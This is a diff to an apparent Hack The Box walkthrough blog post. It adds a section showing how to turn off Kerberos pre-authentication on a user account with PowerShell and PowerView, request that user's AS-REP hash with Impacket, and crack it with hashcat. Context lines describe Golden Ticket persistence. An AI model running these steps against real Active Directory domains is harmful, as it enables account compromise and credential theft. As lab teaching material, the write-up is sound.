@@ -1,9 +1,9 @@
 +++
-tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "Kerberos", "Kerberoasting", "DACLS", "ACL", "pwsafe", "Download Cradle"]
+tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "Kerberos", "Kerberoasting", "DACLS", "ACL", "pwsafe", "Download Cradle", "AS-REPRoasting"]
 draft = true
 title = "Administrator HTB Walkthrough"
 author = "bloodstiller"
-date = 2024-10-10
+date = 2024-11-04
 +++
 
 ## Administrator Hack The Box Walkthrough/Writeup: {#administrator-hack-the-box-walkthrough-writeup}
@@ -663,6 +663,63 @@ date = 2024-10-10
         -   A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials.
         -   This makes it a reliable backdoor, especially if re-access is needed long after initial entry.
         -   **Think about it**: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the `KRBTGT` account, not individual users.
+
+
+## 5. Beyond Root: {#5-dot-beyond-root}
+
+-   There is an alternative way to own Ethan after we have control Emily.
+-   As we have `GenericWrite` over Ethan we can set the `DONT_REQ_PREAUTH` flag (setting to be to true) on his account to enable us to perform an AS-REP roasting attack on his account to retrieve a hash to crack.
+-   This attack can be with powerview or the inbuilt Active Directory PowerShell Module, I will show you with both.
+
+-   **First lets verify that the** `DONT_REQ_PREAUTH` **flag is not already set on any accounts by using the AD PowerShell module**:
+    -   `Get-DomainUser -PreauthNotRequired`
+    -   As we can see it is not.
+        -   {{< figure src="/ox-hugo/2024-11-12-073246_.png" >}}
+
+
+### Using AD PowerShell Module to set `DONT_REQ_PREAUTH` flag on Ethan's account: {#using-ad-powershell-module-to-set-dont-req-preauth-flag-on-ethan-s-account}
+
+-   This module is already built in and enabled on this host so this is the easiest way.
+-   **Using Active Directory PowerShell Module**:
+    -   `Get-ADUser Ethan | Set-ADAccountControl -DoesNotRequirePreAuth $true`
+    -   {{< figure src="/ox-hugo/2024-11-12-073003_.png" >}}
+-   **Verify it worked**:
+    -   `Get-DomainUser -PreauthNotRequired`
+    -   {{< figure src="/ox-hugo/2024-11-12-073026_.png" >}}
+
+
+### Using PowerView to set `DONT_REQ_PREAUTH` flag on Ethan's account: {#using-powerview-to-set-dont-req-preauth-flag-on-ethan-s-account}
+
+-   **Transfer PowerView via evil-winrm**:
+    -   {{< figure src="/ox-hugo/2024-11-12-071020_.png" >}}
+
+-   **Import powerview**:
+    -   `. .\PowerView.ps1`
+    -   {{< figure src="/ox-hugo/2024-11-12-071002_.png" >}}
+
+-   **Set the Pre-Auth to be true PowerView**:
+    -   `Set-DomainObject -Identity ethan -Set @{'userAccountControl' = 4194304}`
+    -   +Note+: Setting userAccountControl to 4194304 disables Pre-Authentication (equivalent to DoesNotRequirePreAuth).
+    -   {{< figure src="/ox-hugo/2024-11-12-072652_.png" >}}
+
+-   **Verify it worked**:
+    -   `Get-DomainUser -UACFilter DONT_REQ_PREAUTH`
+    -   {{< figure src="/ox-hugo/2024-11-12-072711_.png" >}}
+    -   As we can see it worked.
+
+
+### AS-REP roasting Ethan using Impacket-GetNPUsers: {#as-rep-roasting-ethan-using-impacket-getnpusers}
+
+-   `impacket-GetNPUsers $domain/ethan -dc-ip $box -no-pass -format hashcat -outputfile asrep.txt`
+-   {{< figure src="/ox-hugo/2024-11-12-073830_.png" >}}
+-   +Note+: For some reason it threw some errors, despite having the time set &amp; also did not save the hash to a file, so I have to save to a file manually.
+
+
+### Cracking Ethans AS-REP Hash Using Hashcat: {#cracking-ethans-as-rep-hash-using-hashcat}
+
+-   This will still gives us the same password etc as we have seen before it's just a different method for doing so.
+-   `hashcat -m 18200 AS-REP.txt ~/Wordlists/rockyou.txt`
+-   {{< figure src="/ox-hugo/2024-11-12-074515_.png" >}}
 
 
 ## Lessons Learned: {#lessons-learned}
